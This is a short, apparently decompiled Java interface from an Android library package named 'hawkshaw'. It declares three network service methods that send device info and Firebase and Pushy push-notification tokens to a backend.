package com.hawkshaw.library.datalayer.network.service;

import a3.e;
import com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest;
import com.hawkshaw.library.datalayer.models.PushFCMTokenRequest;
import com.hawkshaw.library.datalayer.models.PushPushyTokenRequest;

public interface AppService {
    Object pushDeviceInfo(PushDeviceInfoRequest pushDeviceInfoRequest, e eVar);

    Object pushFCMToken(PushFCMTokenRequest pushFCMTokenRequest, e eVar);

    Object pushPushyToken(PushPushyTokenRequest pushPushyTokenRequest, e eVar);
}
